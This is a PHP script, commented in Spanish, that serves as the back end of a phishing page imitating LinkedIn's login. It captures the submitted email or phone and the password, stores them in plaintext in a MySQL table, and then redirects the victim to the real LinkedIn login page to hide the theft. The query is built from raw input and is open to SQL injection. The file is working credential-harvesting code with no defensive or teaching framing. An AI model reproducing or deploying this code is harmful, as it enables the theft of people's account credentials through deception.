<?php
// Configuración de la base de datos
$host = 'localhost';
$db = 'user_linkedln';
$user = 'root';
$password = '';

// Conectar a la base de datos
$conn = new mysqli($host, $user, $password, $db);

// Verificar si la conexión fue exitosa
if ($conn->connect_error) {
    die("Conexión fallida: " . $conn->connect_error);
}

// Verificar si el formulario fue enviado
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Obtener los datos del formulario
    $username = $_POST['session_key'];  // Nombre de usuario (email o teléfono)
    $password = $_POST['session_password'];  // Contraseña

    // Validar si los campos no están vacíos
    if (!empty($username) && !empty($password)) {
        // Preparar la consulta SQL para insertar los datos en la base de datos
        $sql = "INSERT INTO users (username, password) VALUES ('$username', '$password')";

        if ($conn->query($sql) === TRUE) {
            // Redirigir al usuario a otra página después de insertar los datos
            header("Location: https://www.linkedin.com/login");  // Redirecciona a la pagina real de Linkedin
            exit();  // Asegúrate de llamar a exit() después de header() para detener el script
        } else {
            echo "Error al almacenar los datos: " . $conn->error;
        }
    } else {
        echo "Por favor, complete todos los campos del formulario.";
    }
}

// Cerrar la conexión
$conn->close();
?>